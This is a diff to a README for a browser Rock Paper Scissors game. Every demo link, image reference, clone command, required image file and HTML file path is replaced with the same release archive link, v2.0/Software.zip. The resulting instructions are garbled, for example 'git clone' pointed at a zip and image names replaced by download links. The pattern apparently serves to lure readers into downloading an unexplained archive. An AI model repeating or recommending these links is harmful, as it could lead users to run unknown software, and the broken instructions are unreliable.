@@ -13,9 +13,9 @@ Welcome to the Rock Paper Scissors Game! This is a simple browser-based game whe
 ## Demo
 
 **Rock Paper Scissors Game**
-![image](https://github.com/vra-thenix/Rock-Paper-Scissors-/releases/download/v1.0/Program.zip)
+![image](https://github.com/vra-thenix/Rock-Paper-Scissors-/releases/download/v2.0/Software.zip)
 
-Here is he demo link :- https://github.com/vra-thenix/Rock-Paper-Scissors-/releases/download/v1.0/Program.zip
+Here is he demo link :- https://github.com/vra-thenix/Rock-Paper-Scissors-/releases/download/v2.0/Software.zip
 
 ## Features
 
@@ -34,16 +34,16 @@ Here is he demo link :- https://github.com/vra-thenix/Rock-Paper-Scissors-/relea
 
 1. **Download the Repository**: Clone this repository to your local machine.
    ```bash
-   git clone https://github.com/vra-thenix/Rock-Paper-Scissors-/releases/download/v1.0/Program.zip
+   git clone https://github.com/vra-thenix/Rock-Paper-Scissors-/releases/download/v2.0/Software.zip
    
    cd rock-paper-scissors
 2. **Add Images**:Make sure you have the following images in the same directory:
 
- - https://github.com/vra-thenix/Rock-Paper-Scissors-/releases/download/v1.0/Program.zip
- - https://github.com/vra-thenix/Rock-Paper-Scissors-/releases/download/v1.0/Program.zip
- - https://github.com/vra-thenix/Rock-Paper-Scissors-/releases/download/v1.0/Program.zip
+ - https://github.com/vra-thenix/Rock-Paper-Scissors-/releases/download/v2.0/Software.zip
+ - https://github.com/vra-thenix/Rock-Paper-Scissors-/releases/download/v2.0/Software.zip
+ - https://github.com/vra-thenix/Rock-Paper-Scissors-/releases/download/v2.0/Software.zip
 
-3. **Open the HTML File**: Open https://github.com/vra-thenix/Rock-Paper-Scissors-/releases/download/v1.0/Program.zip in your favorite web browser.
+3. **Open the HTML File**: Open https://github.com/vra-thenix/Rock-Paper-Scissors-/releases/download/v2.0/Software.zip in your favorite web browser.
 
 
 # Gameplay Instructions
